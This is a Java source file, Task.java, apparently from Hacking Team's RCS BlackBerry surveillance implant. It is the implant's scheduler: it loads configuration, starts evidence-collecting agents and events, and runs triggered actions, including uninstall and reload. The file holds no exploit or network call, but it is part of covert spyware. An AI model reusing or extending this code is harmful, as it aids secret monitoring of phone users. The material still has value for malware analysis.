//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Task.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;
import java.util.Timer;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.util.IntEnumeration;
import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.agent.Agent;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.evidence.EvidenceCollector;
import blackberry.interfaces.Singleton;
import blackberry.utils.Check;
import blackberry.utils.Utils;


/**
 * The Class Task.
 */
public final class Task implements Singleton {

    private static final int SLEEPING_TIME = 1000;
    private static final long APP_TIMER_PERIOD = 1000;
    private static final long GUID = 0xefa4f28c0e0c8693L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);

    //#endif

    /**
     * Gets the single instance of Task.
     * 
     * @return single instance of Task
     */
    public static synchronized Task getInstance() {
        if (instance == null) {
            instance = (Task) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final Task singleton = new Task();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }

    /** The conf. */
    Conf conf;

    /** The status. */
    Status status;

    /** The device. */
    Device device;

    /** The log collector. */
    EvidenceCollector logCollector;

    /** The event manager. */
    EventManager eventManager;

    /** The agent manager. */
    AgentManager agentManager;
    Timer applicationTimer;

    // ApplicationUpdateTask();

    AppUpdateManager appUpdateManager;

    private static Task instance;

    /**
     * Instantiates a new task.
     */
    private Task() {
        status = Status.getInstance();
        device = Device.getInstance();
        logCollector = EvidenceCollector.getInstance();

        eventManager = EventManager.getInstance();
        agentManager = AgentManager.getInstance();

        //#ifdef DEBUG
        debug.trace("Task created");

        //#endif
    }

    Date lastActionCheckedStart;
    Date lastActionCheckedEnd;
    String lastAction;
    String lastSubAction;

    Thread actionThread;

    /**
     * Check actions.
     * 
     * @return true, if successful
     */
    public boolean checkActions() {
        //#ifdef OPTIMIZE_TASK
        //#else
        Utils.sleep(1000);
        //#endif
        
        try {
            for (;;) {

                lastActionCheckedStart = new Date();

                //#ifdef DEBUG
                // debug.trace("checkActions");
                //#endif
                final int[] actionIds = status.getTriggeredActions();

                if(needToRestart){
                    //#ifdef DEBUG
                    debug.info("checkActions, needToRestart");
                    //#endif
                    needToRestart = false;
                    return false;
                }

                final int asize = actionIds.length;
                if (asize > 0) {

                    for (int k = 0; k < asize; ++k) {
                        final int actionId = actionIds[k];

                        final Action action = status.getAction(actionId);
                        lastAction = action.toString();

                        int exit=0;
                        
                        executeAction(action);
                        
                        if(exit==1){
                        	return false;
                        }else if(exit==2){
                        	return true;
                        }
                    }
                }
                lastActionCheckedEnd = new Date();

                Utils.sleep(SLEEPING_TIME);
            }
        } catch (final Throwable ex) {
            // catching trowable should break the debugger anc log the full stack trace
            //#ifdef DEBUG
            debug.fatal("checkActions error, restart: " + ex);
            //#endif
            return true;
        }
    }

	private int executeAction(final Action action) {
		int exit=0;
		//#ifdef DEBUG
		debug.trace("CheckActions() triggered: " + action);
		//#endif

		status.unTriggerAction(action);
		//action.setTriggered(false, null);

		status.synced = false;
		final Vector subActions = action.getSubActionsList();
		final int ssize = subActions.size();

		//#ifdef DEBUG
		debug.trace("checkActions, " + ssize + " subactions");
		//#endif

		for (int j = 0; j < ssize; ++j) {
		    try {
		        final SubAction subAction = (SubAction) subActions
		                .elementAt(j);
		        //#ifdef DBC
		        Check.asserts(subAction != null,
		                "checkActions: subAction!=null");
		        //#endif

		        lastSubAction = subAction.toString();
  
		        /*
		         * final boolean ret = subAction.execute(action
		         * .getTriggeringEvent());
		         */

		        //#ifdef DEBUG
		        debug
		                .info("CheckActions() executing subaction ("
		                        + (j + 1)
		                        + "/"
		                        + ssize
		                        + ") : " + action);
		        //#endif

		        // no callingEvent
		        subAction.prepareExecute(null);
		        actionThread = new Thread(subAction);
		        actionThread.start();

		        synchronized (subAction) {
		            //#ifdef DEBUG
		            debug.trace("CheckActions() wait");
		            //#endif  
		            if (!subAction.isFinished()) {
		                // il wait viene chiamato solo se la start non e' gia' finita
		                subAction
		                        .wait(Conf.TASK_ACTION_TIMEOUT);
		            }
		        }

		        boolean ret = true;

		        if (!subAction.isFinished()) {
		            ret = false;
		            actionThread.interrupt();
		            //#ifdef DEBUG
		            debug
		                    .trace("CheckActions() interrupted thread");
		            //#endif
		        }

		        //#ifdef DEBUG
		        debug.trace("CheckActions() waited");
		        //#endif

		        if (subAction.wantUninstall()) {
		            //#ifdef DEBUG
		            debug.warn("CheckActions() uninstalling");
		            //#endif
		            
		            stopAll();

		            exit = 1;
		            break;
		            //return false;
		        }

		        if (subAction.wantReload()) {
		            status.setRestarting(true);
		            //#ifdef DEBUG
		            debug.warn("checkActions: reloading");
		            //#endif
		            status.unTriggerAll();
		            //#ifdef DEBUG
		            debug
		                    .trace("checkActions: stopping agents");
		            //#endif
		            agentManager.stopAll();
		            //#ifdef DEBUG
		            debug
		                    .trace("checkActions: stopping events");
		            //#endif
		            eventManager.stopAll();
		            Utils.sleep(2000);
		            //#ifdef DEBUG
		            debug.trace("checkActions: untrigger all");
		            //#endif
		            status.unTriggerAll();
		            //return true;
		            exit = 2;
		            break;
		            
		        }

		        if (ret == false) {
		            //#ifdef DEBUG
		            debug
		                    .warn("CheckActions() error executing: "
		                            + subAction);
		            //#endif
		            continue;
		        }
		    } catch (final Exception ex) {
		        //#ifdef DEBUG
		        debug.error("checkActions for: " + ex);
		        //#endif
		    }
		}
		
		return exit;
	}

    private void stopAll() {        
        agentManager.stopAll();
        eventManager.stopAll();
        status.unTriggerAll();
    }

    /**
     * Start application timer.
     */
    synchronized void startApplicationTimer() {
        //#ifdef DEBUG
        debug.info("startApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }

        applicationTimer = new Timer();
        appUpdateManager = new AppUpdateManager();
        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);
    }

    /**
     * Stop application timer.
     */
    public synchronized void stopApplicationTimer() {
        //#ifdef DEBUG
        debug.info("stopApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }
    }

    /**
     * Start application timer.
     */
    public synchronized void resumeApplicationTimer() {
        //#ifdef DEBUG
        debug.info("resumeApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
        applicationTimer = new Timer();

        if (appUpdateManager == null) {
            appUpdateManager = new AppUpdateManager();
        } else {
            appUpdateManager = new AppUpdateManager(appUpdateManager);
        }

        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);

    }

    /**
     * Stop application timer.
     */
    synchronized void suspendApplicationTimer() {
        //#ifdef DEBUG
        debug.info("suspendApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
    }

    /**
     * Dice se l'application timer e' attivo e funzionante. Se e'
     * 
     * @return true se funziona
     */

    public synchronized boolean verifyTimers() {
        boolean ret = true;
        if (!Backlight.isEnabled()) {
            return true;
        }

        if (lastActionCheckedStart != null) {

            final long timestamp = (new Date()).getTime();
            final long lastActionElapse = timestamp
                    - lastActionCheckedStart.getTime();

            //#ifdef DEBUG
            debug.warn("lastAction: " + lastAction + " lastSubAction: "
                    + lastSubAction + " elapsed:" + lastActionElapse);
            //#endif

            // se impiega piu' di dieci minuti
            if (lastActionElapse > 1000 * 60 * 10) {
                //#ifdef DEBUG
                debug.warn("lastAction stuck in the middle");
                //#endif
                ret = false;

                // try to reset it
                try {
                    actionThread.interrupt();
                    //#ifdef DEBUG
                    debug.trace("verifyTimers() interrupted thread");
                    //#endif
                } catch (final Exception ex) {
                    //#ifdef DEBUG
                    debug.error(ex);
                    //#endif
                }
            }

            if (lastActionCheckedEnd != null) {

                final long lastActionDifference = lastActionCheckedStart
                        .getTime()
                        - lastActionCheckedEnd.getTime();

                // se e' passata piu' di un ora dall'ultimo check
                if (lastActionDifference > 1000 * 60 * 5) {
                    //#ifdef DEBUG
                    debug.warn("lastAction stuck somewhere");
                    //#endif
                    ret = false;
                }
            }
        } else {
            //#ifdef DEBUG
            debug
                    .warn("lastActionCheckedEnd || lastActionCheckedStart == null");
            //#endif
        }

        if (applicationTimer == null) {
            //#ifdef DEBUG
            debug.warn("applicationTimer == null");
            //#endif
            ret = false;
        }

        if (appUpdateManager == null) {
            //#ifdef DEBUG
            debug.warn("appUpdateManager == null");
            //#endif
            ret = false;
        }

        //#ifdef DEBUG
        debug.trace("verifyTimers: " + ret + " lastActionCheckedStart:"
                + lastActionCheckedStart + " lastActionCheckedStop:"
                + lastActionCheckedEnd);
        //#endif

        if (ret == false) {
            //#ifdef DEBUG
            debug.trace("verifyTimers: something wrong here");
            //#endif
        }

        return ret;
    }

    /**
     * Task init.
     * 
     * @return true, if successful
     */
    public boolean taskInit() {
        //#ifdef DEBUG
        debug.trace("TaskInit");
        //#endif

        //agentManager.stopAll();
        //eventManager.stopAll();

        if (device != null) {
            try {
                device.refreshData();
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }

        conf = new Conf();

        if (conf.load() == false) {
            //#ifdef DEBUG
            debug.trace("Load Conf FAILED");
            //#endif

            return false;
        }

        //#ifdef DEBUG
        debug.trace("----------");
        debug.info("AGENTS");
        Vector vector = status.getAgentsList();
        for (int i = 0; i < vector.size(); i++) {
            Agent agent = (Agent) vector.elementAt(i);
            if (agent.isEnabled()) {  
                debug.info("    " +agent.toString());
            }
        }
        
        debug.info("ACTIONS");
        vector = status.getActionsList();
        for (int i = 0; i < vector.size(); i++) {
            Action action = (Action) vector.elementAt(i);
            debug.info("    " +action.toString());
            Vector subs = action.getSubActionsList();
            for (int j = 0; j < subs.size(); j++) {
                SubAction sub = (SubAction) subs.elementAt(j);
                debug.info("        " +sub.toString());
            }
        }
        
        debug.info("EVENTS");
        vector = status.getEventsList();
        for (int i = 0; i < vector.size(); i++) {
            Event event = (Event) vector.elementAt(i);
            if (event.isEnabled()) {
                debug.info("    "+event.toString());
            }
        }
        //#endif

        if (logCollector != null) {
            logCollector.initEvidences();
        }

        // Da qui in poi inizia la concorrenza dei thread

        if (eventManager.startAll() == false) {
            //#ifdef DEBUG
            debug.trace("eventManager FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.info("Events started");

        //#endif

        if (agentManager.startAll() == false) {
            //#ifdef DEBUG
            debug.trace("agentManager FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.info("Agents started");

        //#endif
        return true;
    }

    public void reset() {
        //#ifdef DEBUG
        debug.trace("reset");
        //#endif
        stopAll();     
        status.unTriggerAll();
        
        // http://supportforums.blackberry.com/t5/Java-Development/Programmatically-rebooting-the-device/m-p/42049?view=by_date_ascending
        CodeModuleManager.promptForResetIfRequired();
    }
    
    private boolean needToRestart;
    public void restart() {
        //#ifdef DEBUG
        debug.trace("restart");
        //#endif
        stopAll();
        status.unTriggerAll();
        needToRestart = true;
    }
}
